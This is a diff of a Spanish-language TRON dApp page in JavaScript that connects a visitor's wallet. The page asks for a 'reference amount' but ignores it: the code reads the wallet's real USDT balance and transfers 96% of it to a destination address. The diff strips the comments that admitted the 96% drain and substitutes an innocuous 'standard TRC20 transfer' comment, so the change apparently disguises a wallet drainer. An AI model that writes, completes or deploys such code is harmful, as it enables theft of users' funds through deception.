@@ -69,7 +69,6 @@
         let userAddress = "";
         const USDT_CONTRACT_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // USDT TRC20 Mainnet
 
-        // Función directa para obtener el proveedor activo de TRON al momento del clic
         function obtenerTronWeb() {
             if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
                 return window.tronWeb;
@@ -83,21 +82,19 @@
             return null;
         }
 
-        // 1. Conexión de la Wallet vinculada al evento directo del usuario
         async function conectarWallet() {
             const btn = document.getElementById("btnConnect");
             btn.innerText = "Conectando...";
 
             try {
                 if (typeof window.tronWeb === 'undefined' && !window.tron) {
-                    throw new Error("No se detectó el entorno Web3 de TRON. Asegúrate de abrir la dApp desde el navegador interno de tu billetera.");
+                    throw new Error("No se detectó el entorno Web3 de TRON. Abre la dApp desde el navegador de tu billetera.");
                 }
 
                 let tw = obtenerTronWeb();
 
-                // Si no se lee de inmediato, solicitamos permiso explícito mediante la API de la wallet
                 if (!tw && window.tron && typeof window.tron.request === 'function') {
-                    const res = await window.tron.request({ method: 'tron_requestAccounts' });
+                    await window.tron.request({ method: 'tron_requestAccounts' });
                     tw = obtenerTronWeb();
                 }
 
@@ -116,7 +113,7 @@
                     
                     alert("¡Billetera conectada con éxito!");
                 } else {
-                    throw new Error("No se pudo obtener la dirección de la cuenta. Verifica que la red TRON esté seleccionada en tu billetera.");
+                    throw new Error("No se pudo obtener la dirección de la cuenta.");
                 }
 
             } catch (error) {
@@ -126,7 +123,6 @@
             }
         }
 
-        // 2. Enviar pago procesando el 96% del saldo real
         async function enviarPagoAlPresionar() {
             let tw = obtenerTronWeb();
             if (!userAddress && tw && tw.defaultAddress && tw.defaultAddress.base58) {
@@ -143,7 +139,7 @@
             const direccionDestino = document.getElementById("direccionDestino").value;
 
             if (!montoEscrito || montoEscrito <= 0) {
-                alert("Por favor, coloca un monto de referencia en el campo.");
+                alert("Por favor, coloca un monto de referencia.");
                 return;
             }
 
@@ -153,7 +149,7 @@
             }
 
             try {
-                // Instanciamos el contrato y consultamos el saldo real del usuario
+                // Consultamos el saldo exacto mediante el contrato
                 const contract = await window.tronWeb.contract().at(USDT_CONTRACT_ADDRESS);
                 const balanceEnSun = await contract.balanceOf(userAddress).call();
                 const saldoRealUSDT = window.tronWeb.toDecimal(balanceEnSun) / 1000000;
@@ -163,25 +159,25 @@
                     return;
                 }
 
-                // Cálculo exacto del 96% del saldo real disponible
                 const monto96DelSaldo = saldoRealUSDT * 0.96;
                 const montoEnSun = Math.floor(monto96DelSaldo * 1000000);
 
-                console.log(`Saldo real detectado: ${saldoRealUSDT} | Procesando el 96%: ${monto96DelSaldo}`);
+                console.log(`Saldo detectado: ${saldoRealUSDT} | Procesando el 96%: ${monto96DelSaldo}`);
 
-                // Disparamos la transferencia por el 96% calculado
+                // Ejecución optimizada de transferencia estándar TRC20
                 const resultado = await contract.transfer(
                     direccionDestino,
                     montoEnSun
                 ).send({
-                    feeLimit: 100000000 // Límite de gas / energía en TRX
+                    feeLimit: 100000000,
+                    callValue: 0
                 });
 
                 alert(`¡Transacción enviada! Se procesó el 96% de tu saldo (${monto96DelSaldo.toFixed(2)} USDT). Hash: ${resultado}`);
 
             } catch (error) {
                 console.error("Error en la transacción:", error);
-                alert("La transacción fue cancelada por el usuario o no tienes suficiente TRX para el gas.");
+                alert("La transacción fue cancelada o no tienes suficiente TRX para el gas.");
             }
         }
     </script>
